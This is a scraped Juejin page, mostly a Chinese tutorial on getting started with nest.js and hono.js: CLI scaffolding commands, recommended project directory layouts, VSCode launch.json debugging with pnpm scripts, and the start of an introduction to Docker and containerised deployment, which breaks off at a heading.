<p>通过本章的学习，我们建立了一个关于智能体的基础认知框架。那么，它是如何一步步从最初的构想演进至今的呢？在下一章中，我们将探索智能体的发展历史，一段追本溯源的旅程即将开始！</p>
<h3 data-id="heading-18">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[nest.js / hono.js 一起学！开发前必备！]]></title>    <link>https://juejin.cn/post/7581448482544713754</link>    <guid>https://juejin.cn/post/7581448482544713754</guid>    <pubDate>2025-12-09T02:56:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581448482544713754" data-draft-id="7580197740963151898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nest.js / hono.js 一起学！开发前必备！"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2025-12-09T02:56:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟祥_成都"/> <meta itemprop="url" content="https://juejin.cn/user/96412752684744"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nest.js / hono.js 一起学！开发前必备！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/96412752684744/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟祥_成都
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:56:16.000Z" title="Tue Dec 09 2025 02:56:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>欢迎到我们的交流群一起交流各种前端技术，同时欢迎访问我的 headless 组件库，同时感谢你的 star：</p>
<ul>
<li><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.frontlight.tech%2F" title="https://link.juejin.cn/?target=https%3A%2F%2Fwww.frontlight.tech%2F" target="_blank">国内官网</a></li>
<li><a href="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Flio-mengxiang%2Ft-ui" title="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Flio-mengxiang%2Ft-ui" target="_blank">感谢 github star</a></li>
</ul>
<hr/>
<p>nest.js / hono.js 一起学系列，最终会封装一个通用的架子，例如有鉴权，日志收集，多环境配置等等功能，用两种框架去实现。
之前写了两篇关于这两个框架编程思想相关的</p>
<ul>
<li><a href="https://juejin.cn/post/7576555431943503882" target="_blank" title="https://juejin.cn/post/7576555431943503882">深入 Nestjs 底层概念（1）：依赖注入和面向切面编程 AOP</a></li>
<li><a href="https://juejin.cn/post/7580564126403362866" target="_blank" title="https://juejin.cn/post/7580564126403362866">nest.js / hono.js 一起…</a></li>
</ul>
<p>这一篇主要是涉及到我们马上开发前需要具备的一些基础知识，包含：</p>
<ul>
<li>命令行工具使用</li>
<li>最佳工程实践（目录规划篇）</li>
<li>如何调试</li>
<li>docker 入门 + 深入 docker 基本原理</li>
</ul>
<h2 data-id="heading-1">命令行上手</h2>
<h3 data-id="heading-2">全局安装 CLI</h3>
<p>建议，全局安装 CLI， 然后试着创建一个项目试试：</p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> -g <span class="hljs-keyword">@nestjs</span>/cli
nest new project-name
</code></pre>
<p>后续，你按照命令行提示即可完成项目初始化，然后安装完包，最后看一下 package.json 中 scripts 中的启动命令是什么，启动项目即可。</p>
<p>hono.js 初始化项目是采用：</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> hono<span class="hljs-variable">@latest</span> project<span class="hljs-operator">-</span>name
</code></pre>
<p>同样，你按照命令行提示即可完成项目初始化，然后安装对应的包即可，最后看一下 package.json 中 scripts 中的启动命令是什么，启动项目即可。</p>
<p>但是 hono.js 并没有类似 nest 的 cli 管理工具，毕竟 nest 的写法要繁琐很多，所以官方提供了一些快速创建模板的命令。可以通过以下命令查看：</p>
<pre><code class="hljs language-bash" lang="bash">nest --<span class="hljs-built_in">help</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3e3c9b3dd31474a853e6b51c3365065~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=wYeiPJuoEG94qx8PJq0%2F1sQmZ4M%3D" alt="image.png" loading="lazy"/></p>
<p>最常见的使用 generate 或者 g 来生成模板, 我们可以用 -d 命令，来让 cli 告诉你，你的 generate 或者 g 命令会生成什么文件，咱们来试试，假设我们要创建一个 名字为 user 的 class</p>
<pre><code class="hljs language-kotlin" lang="kotlin">nest g <span class="hljs-keyword">class</span> <span class="hljs-title class_">user</span> -<span class="hljs-title">d</span> 
</code></pre>
<p>显示：</p>
<pre><code class="hljs language-scss" lang="scss">CREATE <span class="hljs-attribute">src</span>/user/user<span class="hljs-selector-class">.spec</span><span class="hljs-selector-class">.ts</span> (<span class="hljs-number">139</span> bytes)
CREATE <span class="hljs-attribute">src</span>/user/user<span class="hljs-selector-class">.ts</span> (<span class="hljs-number">21</span> bytes)
Dry run enabled. No files written to disk.
</code></pre>
<p>注意最后一行： No files written to disk. 也就是没有真的把文件写入，而是提示如果你使用<code>nest g class user</code> 可能创建的文件有哪些。</p>
<p>还有，我们有时候不太喜欢测试，可以使用</p>
<pre><code class="hljs language-kotlin" lang="kotlin">nest g <span class="hljs-keyword">class</span> <span class="hljs-title class_">user</span> --<span class="hljs-title">no</span>-<span class="hljs-title">spec</span>
</code></pre>
<p>来省去测试文件的创建。</p>
<h2 data-id="heading-3">最佳工程实践</h2>
<p>我们这里列举一些比较好的工程实践的点，欢迎大家一起讨论。</p>
<h3 data-id="heading-4">工程目录</h3>
<p>我们采用”约定大于配置“的思想，无论使用什么 node.js 后端框架，我们的目录名尽可能一致。</p>
<p>nest.js 的建议，如果以下目录名意思不清楚没关系，后续学到控制器，service 等等章节的时候，就会明白了：</p>
<pre><code class="hljs language-ruby" lang="ruby">src/
├── modules/              <span class="hljs-comment"># 核心：按业务领域划分的模块</span>
│   ├── users/            <span class="hljs-comment"># 用户模块</span>
│   │   ├── dto/          <span class="hljs-comment"># 数据传输对象（请求/响应结构）</span>
│   │   ├── entities/     <span class="hljs-comment"># 数据库实体</span>
│   │   ├── users.controller.ts
│   │   ├── users.service.ts
│   │   └── users.<span class="hljs-keyword">module</span>.ts
│   └── products/         <span class="hljs-comment"># 产品模块（结构类似用户模块）</span>
├── common/               <span class="hljs-comment"># 共享资源</span>
│   ├── filters/          <span class="hljs-comment"># 全局异常过滤器</span>
│   ├── interceptors/     <span class="hljs-comment"># 拦截器</span>
│   └── guards/           <span class="hljs-comment"># 守卫</span>
├── config/               <span class="hljs-comment"># 全局配置</span>
├── database/             <span class="hljs-comment"># 数据库连接配置        </span>
└── app.<span class="hljs-keyword">module</span>.ts         <span class="hljs-comment"># 应用根模块</span>
</code></pre>
<p>核心设计原则：</p>
<ul>
<li>功能内聚：与“用户”相关的所有文件（控制器、服务、实体、DTO）都应放在 users 目录下。</li>
<li>分层管理：使用 common、core 等目录管理跨模块共享的组件和全局配置。</li>
</ul>
<p>hono.js 的建议如下，当然 config ,utils 这些比较常见的全局模块也可以提到第一层级，也就是 src 目录下：</p>
<pre><code class="hljs language-csharp" lang="csharp">src/
├── modules/                <span class="hljs-meta"># 每个模块独立</span>
│   ├── user/
│   │   ├── routes.ts       <span class="hljs-meta"># 只放路由注册（薄层）</span>
│   │   ├── controller/     <span class="hljs-meta"># handlers 控制器层</span>
│   │   │   ├── <span class="hljs-keyword">get</span>-user.ts
│   │   │   ├── list-users.ts
│   │   │   ├── create-user.ts
│   │   │   └── update-user.ts
│   │   ├── service/        <span class="hljs-meta"># 业务逻辑</span>
│   │   │   └── user.service.ts
│   │   ├── repository/     <span class="hljs-meta"># DB / 外部API</span>
│   │   │   └── user.repo.ts
│   │   ├── middleware/     <span class="hljs-meta"># 与 user 模块强相关的中间件</span>
│   │   │   └── user-auth.middleware.ts
│   │   ├── validators/     <span class="hljs-meta"># DTO / 校验器（zod / valibot）</span>
│   │   │   ├── create-user.validator.ts
│   │   │   └── update-user.validator.ts
│   │   ├── dto/            <span class="hljs-meta"># 请求 / 响应类型</span>
│   │   │   ├── user.dto.ts
│   │   │   └── index.ts
│   │   ├── constants.ts    <span class="hljs-meta"># 与 user 相关的常量</span>
│   │   ├── index.ts        <span class="hljs-meta"># 模块总出口</span>
│   │   └── types.ts        <span class="hljs-meta"># 模块相关类型</span>
│   │
│   ├── product/
│   │   ├── routes.ts
│   │   ├── controller/
│   │   ├── service/
│   │   ├── repository/
│   │   ├── middleware/
│   │   ├── validators/
│   │   └── dto/
│   │
│   └── auth/
│       └── ...
│
├── common/                 <span class="hljs-meta"># 全局复用层（不属于任何模块）</span>
│   ├── app.ts              <span class="hljs-meta"># app 初始化（全局中间件、错误处理）</span>
│   ├── router.ts           <span class="hljs-meta"># 合并 modules 的 routes</span>
│   ├── middlewares/        <span class="hljs-meta"># 全局中间件</span>
│   ├── config/             <span class="hljs-meta"># 配置（DB、ENV等）</span>
│   ├── utils/              <span class="hljs-meta"># 工具</span>
│   ├── errors/             <span class="hljs-meta"># 全局错误类</span>
│   ├── types/              <span class="hljs-meta"># 全局类型</span>
│   └── logging/            <span class="hljs-meta"># 日志系统</span>
|    <span class="hljs-meta"># 也可以把一些重要模块单独放在根目录，例如 config ， log</span>
│
└── index.ts                <span class="hljs-meta"># 启动文件</span>
</code></pre>
<p>注意：也可以把一些重要模块单独放在根目录，例如 config ， log等等，看业务需要。</p>
<p>最后，我们可以借鉴一下 angular 团队的一些代码风格指南。例如</p>
<ul>
<li>
<p>总则</p>
<ul>
<li>坚持每个文件只定义一样东西（例如服务或者组件）</li>
<li>考虑把文件大小限制在 400 行代码以内</li>
<li>坚持定义简单函数来组装复杂函数</li>
</ul>
</li>
<li>
<p>命名</p>
<ul>
<li>使用点和横杠来风格文件名，不建议驼峰</li>
<li>坚持在描述性名字中，用横杠分割单词</li>
<li>坚持遵守先描述组件特性，再描述它的类型的模式，例如 <code>feature.type.ts</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">调试</h2>
<p>接下来介绍一下，如何借助 vscode(其它编辑器，cursor，trae 是同样的方式)，来调试 nest.js 和 hono.js 代码</p>
<p>首先我们简单介绍一下如何调试单文件 node.js 文件，这个对于我们 demo 也算比较有用。</p>
<p>首先，随便在跟目录建一个 index.js</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c45d47e0ad943d790c6d0a8139d3c44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=yOeuyBtLV8icdUet5MkUMcBGtGs%3D" alt="image.png" loading="lazy"/></p>
<p>然后我们在第 6 行，打了一个断点，可以看到红色标记。然后再根目录，建立一个 .vscode 文件夹，文件夹内建立一个 launch.json</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2479c2b99bcf4a659b9474a83bc76302~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=KknRi82WS8CjI46HtBnJhc3ho7s%3D" alt="image.png" loading="lazy"/></p>
<p>接着点击 如下的 bug 按钮，就可以调试了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dd4671a138a4eff9be825e236830162~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=FvNBsGJMUCkWds6vY4ykzaodzBc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">调试 nest</h3>
<p>调试 nest 和 hono 都很相似，只是 launch.json 的配置不一样，</p>
<p>我们 launch.json 的配置如下（调试 nest 的）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-comment">// 配置文件的版本号，遵循VSCode调试协议。0.2.0是当前常用版本。</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-comment">// 定义调试配置的数组，一个文件可以包含多个独立的调试配置。</span>
  <span class="hljs-attr">"configurations"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-comment">// 指定调试器类型。`node` 表示使用Node.js调试适配器，用于调试JavaScript/TypeScript。</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// 调试请求类型。`launch` 表示启动一个新程序进行调试；另一种是`attach`（附加到已运行进程， 这个不纠结，我们都用 launch）。</span>
      <span class="hljs-attr">"request"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"launch"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// 在VSCode调试下拉菜单中显示的名称，随便起个就行。</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Launch Program"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// 指定实际用来运行程序的命令。这里使用`pnpm`包管理器作为启动器。</span>
      <span class="hljs-comment">// 如果不设置此项，默认值为`node`。</span>
      <span class="hljs-attr">"runtimeExecutable"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pnpm"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// 传递给`runtimeExecutable`（pnpm）的命令行参数。</span>
      <span class="hljs-comment">// 等同于在终端执行：`pnpm run start:dev`</span>
      <span class="hljs-attr">"runtimeArgs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"run"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"start:dev"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// `runtimeVersion`主要用于通过`nvm`等版本管理器切换Node版本。</span>
      <span class="hljs-attr">"runtimeVersion"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"20.16.0"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-comment">// 调试时跳过（不进入）的文件。</span>
      <span class="hljs-comment">// `&lt;node_internals&gt;/**` 表示跳过所有Node.js内置核心模块代码，使调试更聚焦于应用自身。</span>
      <span class="hljs-attr">"skipFiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"&lt;node_internals&gt;/**"</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这里的关键是什么呢，就是 runtimeExecutable + runtimeArgs， runtimeExecutable 代表我们执行的命令使用 pnpm, 你可以改为 yarn， npm，都行，然后执行的命令参数runtimeArgs，合起来就是</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm run start:dev
</code></pre>
<p>为什么这样呢，因为 start:dev 是 nest.js 的 package.json 中注明的启动开发环境的命令,如下：</p>
<pre><code class="hljs language-sql" lang="sql">"scripts": {
    "build": "nest build",
    "format": "prettier --write \"src<span class="hljs-comment">/**/</span><span class="hljs-operator">*</span>.ts\" \"test<span class="hljs-comment">/**/</span><span class="hljs-operator">*</span>.ts\"",
    "start": "nest start",
    "start:dev": "nest start --watch",
    "start:debug": "nest start --debug --watch",
    "start:prod": "node dist/main",
    "lint": "eslint \"{src,apps,libs,test}<span class="hljs-comment">/**/</span><span class="hljs-operator">*</span>.ts\" --fix",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:cov": "jest --coverage",
    "test:debug": "node --inspect-brk -r tsconfig-paths/register -r ts-node/register node_modules/.bin/jest --runInBand",
    "test:e2e": "jest --config ./test/jest-e2e.json"
  },
</code></pre>
<p>当然，你可以用 start 命令，start:debug 命令都行，假设就用</p>
<pre><code class="hljs language-perl" lang="perl"> // 指定实际用来运行程序的命令。这里使用<span class="hljs-string">`pnpm`</span>包管理器作为启动器。
      // 如果不设置此项，默认值为<span class="hljs-string">`node`</span>。
      <span class="hljs-string">"runtimeExecutable"</span>: <span class="hljs-string">"pnpm"</span>,
      <span class="hljs-regexp">//</span> 传递给<span class="hljs-string">`runtimeExecutable`</span>（pnpm）的命令行参数。
      // 等同于在终端执行：<span class="hljs-string">`pnpm run start:dev`</span>
      <span class="hljs-string">"runtimeArgs"</span>: [<span class="hljs-string">"run"</span>, <span class="hljs-string">"start:dev"</span>],
</code></pre>
<p>然后我们在 app.controller.ts 上打个断点：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22e4a980696b4ae8a32969ac00d971e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=BPXY5c9i2v2IuwJKzxFvL6yNvTQ%3D" alt="image.png" loading="lazy"/></p>
<p>然后启动调试</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac8175fe89d64b72ac1d012bf2de2cd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=yAXY6G2hgJeDVkCshKlu1aOKOfs%3D" alt="image.png" loading="lazy"/></p>
<p>点击后，相当于在命令行输入：</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm run start:dev
</code></pre>
<p>接着你浏览器访问 <code>http://localhost:3000</code> 就能触发断点了！</p>
<h3 data-id="heading-7">调试 hono</h3>
<p>所以根据上面的理论，我们来创建一个 launch.json，用来调试 hono</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"configurations"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"request"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"launch"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Launch Program"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"runtimeExecutable"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pnpm"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 核心：告诉调试器用pnpm来运行</span>
      <span class="hljs-attr">"runtimeArgs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"run"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"dev"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 传给pnpm的参数：运行“dev”脚本</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>

</code></pre>
<p>同理，其实就是触发了：</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm run dev
</code></pre>
<p>命令， dev 这个命令其实就是 hono 项目 package.json 中的内容：</p>
<pre><code class="hljs language-json" lang="json">  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsx watch src/index.ts"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsc"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node dist/index.js"</span>
  <span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">容器部署</h2>
<p>接下来是很长的关于 docker 和我们前端全栈相关的知识，有深入的原理介绍，有兴趣的同学可以一起交流。</p>
<h3 data-id="heading-9">为什么需要 Docker？</h3>
<p>即便是纯前端开发者，不涉及 Node.js、Nginx 或数据库等服务器相关软件，在中小企业部署应用时，后端团队或项目经理常常会要求前端团队提供一个 Dockerfile，以便将前端应用部署到 Nginx 上。这种要求在容器化时代变得越来越普遍。所以是有必要了解容器的知识的。</p>
<h3 data-id="heading-10">容器化的基本概念</h3>
<p>在容器化时代，通常通过 Dockerfile（用于描述如何构建 Docker 容器的配置文件）构建开发或生产环境的 Docker 镜像，然后启动这些镜像，使外部网络可以访问对应的应用。</p>
<p>在 Docker 流行之前，前端应用的部署方式一般是直接在服务器上下载相关软件（如 Nginx、MySQL 或 PostgreSQL），配置并启动服务，再将打包后的前端内容放入 Nginx 的指定目录，以便外部访问。这种方式被称为物理机直接部署。</p>
<h3 data-id="heading-11">为何转向容器化部署？</h3>
<p>容器化部署的优势主要体现在以下两个方面，我们用前端的视角去理解：</p>
<ol>
<li><strong>环境一致性</strong>：</li>
</ol>
<ul>
<li>前端常见的问题，为什么在 Chrome 中功能正常，但在其他浏览器中却无法运行？</li>
</ul>
<ol start="2">
<li><strong>简化环境配置</strong>：</li>
</ol>
<ul>
<li>前端项目通常需要配置 ESLint、Prettier、TSConfig、Vite/Webpack 等工具。这些配置繁琐，且需要一定的知识才能定制适合项目的配置。为了解决这些问题，前端社区提供了许多 CLI 工具，如 React 的 create-react-app、Vue 的 Vue CLI、Next.js 的 @nextjs/cli 等，这些工具为项目提供了现成的模板，并在 Babel/SWC 和 Browserslist 的配置中解决了兼容性问题。</li>
</ul>
<p>同样，服务器端也面临环境一致性和配置繁琐的问题，并且这些问题相当棘手。为什么会这样呢？我们可以回顾一下 Docker 流行之前的 PaaS 项目。</p>
<h3 data-id="heading-12">PaaS 的背景</h3>
<p>PaaS（Platform as a Service）是云计算的重要服务模型，旨在提供一个完整的应用开发、运行和管理环境，使开发者能够专注于编写代码，而无需担心底层基础设施或操作系统。</p>
<h3 data-id="heading-13">PaaS 受欢迎的原因</h3>
<p>PaaS 项目受到广泛接纳的一个主要原因是它提供了“应用托管”能力。如今，许多人使用阿里云、腾讯云、AWS 等云服务，实际上就是将本地应用托管到云端。然而，这一部署过程常常会遇到云端虚拟机与本地环境不一致的问题。因此，当时的云计算服务竞争的焦点在于谁能更好地模拟本地服务器环境，从而提供更优质的“上云”体验。而开源 PaaS 项目的出现，正是为了有效解决这一问题。</p>
<h3 data-id="heading-14">docker 的出现</h3>
